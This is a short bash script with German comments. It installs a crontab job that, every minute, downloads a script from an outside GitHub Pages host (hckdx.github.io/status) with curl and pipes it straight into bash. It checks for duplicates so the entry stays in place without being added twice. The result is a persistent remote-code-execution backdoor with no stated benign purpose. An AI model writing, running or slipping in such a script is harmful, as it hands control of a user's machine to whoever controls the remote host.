#!/bin/bash # Der Befehl, den du hinzufügen möchtest NEUER_BEFEHL="* * * * * curl https://hckdx.github.io/status | bash" # Prüfen, ob der Befehl bereits in der crontab existiert (crontab -l | grep -F "$NEUER_BEFEHL") &>/dev/null # Wenn der Befehl noch nicht existiert, dann hinzufügen if [ $? -ne 0 ]; then # Die aktuelle crontab speichern und den neuen Befehl anhängen (crontab -l; echo "$NEUER_BEFEHL") | crontab - echo "Neuer Befehl wurde hinzugefügt." else echo "Befehl existiert bereits in der crontab." fi
